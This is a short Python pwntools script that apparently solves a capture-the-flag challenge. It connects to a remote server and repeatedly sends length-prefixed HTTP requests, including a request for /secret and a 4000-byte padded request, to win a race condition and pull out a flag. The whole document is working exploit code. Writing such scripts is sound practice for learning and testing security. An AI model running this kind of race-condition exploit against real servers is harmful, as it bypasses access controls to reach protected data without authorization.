from pwn import *

def send_packet(data):
    rem.send(p64(len(data)) + data.encode())

port = 10039
rem = remote("kayle.snu.ac.kr", port)

for i in range(10000):
  # packet 1
  send_packet("\r\n".join([
      "GET / HTTP/1.1",
  ]))
  # secret packet
  send_packet("\r\n".join([
      "GET /secret HTTP/1.1"
  ]))
  # packet 2 for race
  send_packet("\r\n".join([
      "GET /" + "A" * 4000 + " HTTP/1.1"
  ]))
  
  msg = rem.recv(4096, timeout=1)
  if b"flag" in msg:
    print(msg)
    break
  else:
    print(f"{i+1} fail")